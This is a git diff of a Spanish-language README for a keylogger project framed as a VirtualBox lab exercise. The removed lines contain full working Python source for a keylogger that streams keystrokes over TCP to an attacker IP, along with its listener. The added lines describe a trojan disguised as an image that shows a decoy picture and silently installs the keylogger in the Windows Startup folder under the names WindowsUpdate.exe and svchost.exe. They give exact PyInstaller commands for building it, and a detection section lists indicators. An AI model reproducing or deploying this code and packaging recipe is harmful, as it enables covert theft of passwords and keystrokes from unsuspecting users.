@@ -1,231 +1,296 @@
-
-# DOCUMENTACIÓN - SIMULACIÓN DE KEYLOGGER EN VLAN
+# DOCUMENTACIÓN
 
 ## Objetivo del Proyecto
 
-Demostrar cómo funciona un keylogger básico en un entorno controlado de laboratorio, mostrando la captura de teclas en tiempo real desde una máquina víctima hacia una máquina atacante dentro de una VLAN aislada.
+Demostrar el funcionamiento de un keylogger con persistencia automática en un entorno controlado de laboratorio, mostrando captura de teclas en tiempo real, reconexión automática, almacenamiento offline y persistencia en el sistema operativo.
 
 ---
 
 ## Arquitectura del Sistema
 ```
-┌─────────────────┐         Socket TCP         ┌─────────────────┐
-│   PC VÍCTIMA    │ ─────────────────────────> │   PC ATACANTE   │
-│  192.168.1.69   │      Puerto 4444           │  192.168.1.68   │
-│                 │                            │                 │
-│ keylogger.py    │   Envío de teclas          │  listener.py    │
-│ (Captura)       │   en tiempo real           │  (Recepción)    │
-└─────────────────┘                            └─────────────────┘
+┌─────────────────────────┐         Socket TCP         ┌─────────────────────────┐
+│      PC VÍCTIMA         │ ─────────────────────────> │      PC ATACANTE        │
+│    10.10.10.6           │      Puerto 4444           │     10.10.10.5          │
+│                         │                            │                         │
+│  SystemService.exe      │   Envío de teclas          │    Listener.exe         │
+│  (Captura + Persist.)   │   en tiempo real           │    (Recepción)          │
+│                         │                            │                         │
+│  ┌──────────────────┐   │   Reconexión automática    │  ┌──────────────────┐   │
+│  │ Startup Folder   │   │   Buffer offline           │  │ Logs por sesión  │   │
+│  │ WindowsUpdate.exe│   │                            │  │ Servidor infinito│   │
+│  └──────────────────┘   │                            │  └──────────────────┘   │
+└─────────────────────────┘                            └─────────────────────────┘
 ```
 
 ---
 
-## CÓDIGO 1: Atacante.py (Listener)
+## Componentes del Sistema
 
-### Propósito
-Recibir y mostrar en tiempo real todas las pulsaciones de teclas capturadas por el keylogger de la víctima.
+### victima.pyw
 
-### Código Completo
-```python
-import socket
+Keylogger que captura pulsaciones de teclas con las siguientes características:
 
-print(r"""
-+--------------------------------------------------+
-|                                                  |
-|                 KEYLOGGER LISTENER               |
-|                                                  |
-+--------------------------------------------------+
-""")
+- Captura todas las teclas incluyendo caracteres especiales
+- Detecta estado de Caps Lock para mayúsculas y minúsculas
+- Persistencia automática copiándose a la carpeta Startup de Windows
+- Reconexión automática al servidor atacante cada 5 segundos
+- Buffer offline que guarda teclas en archivo temporal cuando no hay conexión
+- Al reconectar envía primero todas las teclas guardadas offline
+- Maneja espacio, enter, tab y backspace correctamente
 
-s = socket.socket()
-s.bind(('0.0.0.0', 4444))
-s.listen(1)
+### Atacante.py
 
-conn, addr = s.accept()
-print(f"Dispositivo conectado desde >  {addr[0]}")
-print("#"*50)
-print("Captura en tiempo real: \n")
+Servidor que recibe y registra las teclas capturadas con las siguientes características:
 
-while True:
-    try:
-        data = conn.recv(1024)
-        if not data:
-            print("\n\nConexión cerrada")
-            break
-        
-        print(data.decode('utf-8', errors='ignore'), end='', flush=True)
-    
-    except KeyboardInterrupt:
-        print("\n\nListener detenido")
-        break
-    except:
-        print("\n\nError en conexión")
-        break
+- Servidor permanente que acepta múltiples conexiones consecutivas
+- Animación de espera con caracteres que parpadean
+- Registra cada sesión con timestamp, IP y puerto
+- Guarda logs individuales por sesión en carpeta logs/
+- Muestra captura en tiempo real en pantalla
+- Animación de desconexión que parpadea 3 veces
+- Limpia pantalla y reinicia automáticamente para nueva sesión
+- Maneja backspace borrando el carácter anterior en pantalla
 
-conn.close()
-s.close()
-```
+### ImagenFalsa.py
 
-### Funcionamiento
+Troyano disfrazado como imagen con las siguientes características:
 
-1. Crea un socket TCP/IP
-2. Vincula el socket al puerto 4444 en todas las interfaces de red
-3. Espera una conexión entrante de la víctima
-4. Acepta la conexión y muestra la IP del cliente conectado
-5. Entra en un bucle infinito que recibe datos continuamente
-6. Decodifica los bytes recibidos a texto UTF-8
-7. Muestra las teclas capturadas en tiempo real sin saltos de línea
-8. Maneja la desconexión del cliente o interrupción por teclado
-9. Cierra las conexiones correctamente al finalizar
+- Muestra imagen Amerike.png como distracción
+- Extrae SystemService.exe embebido del ejecutable
+- Copia el keylogger a la carpeta Startup para persistencia
+- Copia el keylogger a carpeta TEMP y lo ejecuta inmediatamente
+- Ejecución sin ventana visible usando flags de proceso
+- Usuario solo ve la imagen mientras el keylogger se instala
 
 ---
 
-## CÓDIGO 2: keylogger.py (Víctima)
+## Flujo de Operación
 
-### Propósito
-Capturar cada pulsación de tecla en el sistema víctima y enviarla en tiempo real al atacante.
+### Primera Ejecución
 
-### Código Completo
-```python
-from pynput import keyboard
-import socket
-import time
+1. Víctima ejecuta Amerike.exe
+2. Se muestra imagen de Amerike.png
+3. SystemService.exe se copia a Startup/WindowsUpdate.exe
+4. SystemService.exe se copia a TEMP/svchost.exe y se ejecuta
+5. Inicia captura de teclas
+6. Intenta conectar a 10.10.10.5:4444
+7. Si conecta envía teclas en tiempo real
+8. Si no conecta guarda en winlog.txt
 
-ATACANTE_IP = "192.168.1.68"
-ATACANTE_PUERTO = 4444
+### Reinicio del Sistema
 
-def conectar():
-    while True:
-        try:
-            s = socket.socket()
-            s.connect((ATACANTE_IP, ATACANTE_PUERTO))
-            return s
-        except:
-            time.sleep(3)
+1. Windows inicia
+2. Ejecuta automáticamente WindowsUpdate.exe desde Startup
+3. Inicia captura de teclas
+4. Intenta conectar al atacante
+5. Envía buffer offline si existe
+6. Continúa captura en tiempo real
 
-conexion = conectar()
+### Pérdida y Recuperación de Conexión
 
-def al_presionar(tecla):
-    global conexion
-    
-    try:
-        letra = tecla.char
-    except AttributeError:
-        if tecla == keyboard.Key.space:
-            letra = ' '
-        elif tecla == keyboard.Key.enter:
-            letra = '\n'
-        elif tecla == keyboard.Key.backspace:
-            letra = '[BACK]'
-        elif tecla == keyboard.Key.tab:
-            letra = '[TAB]'
-        else:
-            letra = f'[{tecla.name}]'
-    
-    try:
-        conexion.send(letra.encode('utf-8'))
-    except:
-        conexion = conectar()
-        conexion.send(letra.encode('utf-8'))
-
-listener = keyboard.Listener(on_press=al_presionar)
-listener.start()
-listener.join()
-```
-
-### Funcionamiento
-
-1. Define las credenciales del servidor atacante (IP y puerto)
-2. La función `conectar()` intenta establecer conexión TCP con reintentos automáticos cada 3 segundos
-3. Se establece una conexión persistente al iniciar el script
-4. La función `al_presionar()` se ejecuta como callback cada vez que se presiona una tecla
-5. Extrae el carácter de la tecla presionada (letras, números, símbolos)
-6. Maneja teclas especiales (espacio, enter, backspace, tab, etc.) con etiquetas descriptivas
-7. Codifica cada tecla a bytes UTF-8 y la envía inmediatamente por el socket
-8. Si la conexión falla, reconecta automáticamente y reenvía la tecla
-9. El listener de teclado se ejecuta indefinidamente en un hilo separado
+1. Víctima capturando con conexión activa
+2. Conexión se pierde
+3. SystemService detecta desconexión
+4. Guarda teclas en winlog.txt
+5. Continúa capturando offline
+6. Conexión se recupera
+7. Reconecta automáticamente
+8. Envía todo el buffer guardado
+9. Borra winlog.txt
+10. Continúa captura en tiempo real
 
 ---
 
-## Flujo de Datos
-```
-Usuario presiona tecla → pynput detecta evento → Función callback ejecuta → 
-Tecla convertida a string → Codificación UTF-8 → Envío por socket TCP → 
-Transmisión por red → Atacante recibe bytes → Decodificación UTF-8 → 
-Visualización en pantalla
-```
+## Compilación
 
----
-
-## Requisitos Técnicos
-
-### PC Atacante (Kali Linux)
-- Python 3.8+
-- Librería `socket` (incluida por defecto)
-- IP estática: 192.168.1.68
-
-### PC Víctima (Windows)
-- Python 3.8+
-- Librería `pynput`: `pip install pynput`
-- IP estática: 192.168.1.69
-
-### Red
-- VirtualBox con Red Interna configurada
-- Nombre de red: `vlan_lab`
-- Rango: 192.168.1.0/24
-- Sin gateway (red aislada)
-
----
-
-## Ejecución
-
-### Paso 1: Iniciar Listener (Atacante)
+### Requisitos
 ```bash
-python Atacante.py
+pip install pynput
+pip install Pillow
+pip install pyinstaller
 ```
 
-### Paso 2: Ejecutar Keylogger (Víctima)
+### Comandos
+> Nota: No necesitas dependencias cuando se pasa a .exe.
+#### SystemService.exe
 ```bash
-pythonw keylogger.pyw
+python -m PyInstaller --onefile --noconsole --name "SystemService" victima.pyw
 ```
 
-### Paso 3: Observar Captura
-Todas las teclas presionadas en la víctima aparecerán en tiempo real en la terminal del atacante.
-
----
-
-## Detección
-
-### Comando para ver conexiones activas en la víctima
+#### Listener.exe
 ```bash
-netstat -ano | findstr 4444
+python -m PyInstaller --onefile --name "Listener" Atacante.py
 ```
 
-### Filtro de Wireshark
-```
-tcp.port == 4444
-```
-
-### Ver procesos Python en ejecución
+#### Amerike.exe
 ```bash
-tasklist | findstr python
+copy dist\SystemService.exe SystemService.exe
+python -m PyInstaller --onefile --noconsole --add-data "Amerike.png;." --add-data "SystemService.exe;." --icon=amerike.ico --name "Amerike" ImagenFalsa.py
 ```
 
 ---
 
 ## Entorno de Laboratorio
+
+### Configuración de Red
 ```
 Plataforma: VirtualBox
-Red: Red Interna (vlan_lab)
-VM1 (Atacante): Kali Linux - 192.168.1.68/24
-VM2 (Víctima): Windows 10 - 192.168.1.69/24
-Puerto: 4444 TCP
-Protocolo: Socket TCP/IP sin cifrado
+Tipo de Red: Red Interna
+Nombre: vlan_lab
+```
+
+### VM Atacante
+```
+Sistema: Windows 10 / Kali Linux
+IP: 10.10.10.5
+Máscara: 255.255.255.0
+Ejecutable: Listener.exe
+```
+
+### VM Víctima
+```
+Sistema: Windows 10
+IP: 10.10.10.6
+Máscara: 255.255.255.0
+Ejecutable: Amerike.exe
 ```
 
 ---
 
+## Ejecución
 
-## Notas
+### En PC Atacante
+```bash
+Listener.exe
+```
 
-Este proyecto es exclusivamente para fines educativos en entornos controlados de laboratorio. Demuestra los principios de captura de eventos del sistema, comunicaciones cliente-servidor con sockets y transmisión de datos en tiempo real.
+Salida esperada:
+```
+Servidor en puerto 4444
+Esperando conexiones...
+                      Esperando###
+```
+
+### En PC Víctima
+
+Doble clic en Amerike.exe
+
+Resultado:
+- Se abre imagen de Amerike
+- Keylogger se instala silenciosamente
+- Comienza captura inmediata
+
+### En PC Atacante después de conexión
+```
+============================================================
+SESION 1
+10.10.10.6:54321
+2025-01-20 14:30:15
+============================================================
+
+hola mundo
+mi password es 123456
+```
+
+---
+
+## Detección
+
+### En la Víctima
+
+#### Ver procesos sospechosos
+```bash
+tasklist | findstr svchost
+tasklist | findstr WindowsUpdate
+```
+
+#### Ver conexiones activas
+```bash
+netstat -ano | findstr 4444
+```
+
+#### Verificar persistencia
+```bash
+dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+
+#### Ver archivos temporales
+```bash
+dir %TEMP%\winlog.txt
+dir %TEMP%\svchost.exe
+```
+
+### Con Wireshark
+
+Filtro:
+```
+tcp.port == 4444
+```
+
+Captura típica:
+```
+10.10.10.6 → 10.10.10.5  TCP [PSH] Len: 1
+10.10.10.6 → 10.10.10.5  TCP [PSH] Len: 1
+10.10.10.6 → 10.10.10.5  TCP [PSH] Len: 1
+```
+
+### Logs en Atacante
+
+Ubicación:
+```
+logs/s1_20250120_143015_10.10.10.6.txt
+logs/s2_20250120_150230_10.10.10.6.txt
+```
+
+Contenido:
+```
+=== SESION 1 ===
+IP: 10.10.10.6:54321
+Inicio: 2025-01-20 14:30:15
+============================================================
+
+hola mundo
+mi password es 123456
+
+============================================================
+Fin: 2025-01-20 14:45:30
+```
+
+---
+
+## Tecnologías Utilizadas
+
+| Componente | Tecnología | Propósito |
+|------------|------------|-----------|
+| Captura de teclado | pynput.keyboard | Hook de bajo nivel del sistema |
+| Comunicación | socket TCP | Transmisión confiable y ordenada |
+| Persistencia | Startup Folder | Ejecución automática en inicio |
+| Buffer offline | File I/O | Almacenamiento temporal sin conexión |
+| Compilación | PyInstaller | Conversión a ejecutable standalone |
+| Empaquetado | PyInstaller add-data | Embedar recursos en exe |
+| Imagen | PIL Pillow | Mostrar imagen de distracción |
+| Multihilo | threading | Animación sin bloquear servidor |
+
+---
+
+## Vectores de Detección
+
+### A nivel de Red
+- Tráfico constante al puerto 4444
+- Conexión TCP persistente inusual
+- Paquetes pequeños frecuentes
+- Flujo unidireccional víctima a atacante
+
+### A nivel de Sistema
+- Proceso svchost.exe en ubicación inusual
+- Proceso WindowsUpdate.exe ejecutándose
+- Conexión establecida desde proceso no Microsoft
+- Archivo WindowsUpdate.exe en carpeta Startup
+- Archivo temporal winlog.txt en TEMP
+
+### A nivel de Comportamiento
+- Alto uso del listener de teclado
+- Proceso que nunca termina
+- Reinicio automático después de cerrar
+- Ejecución automática al iniciar Windows
+
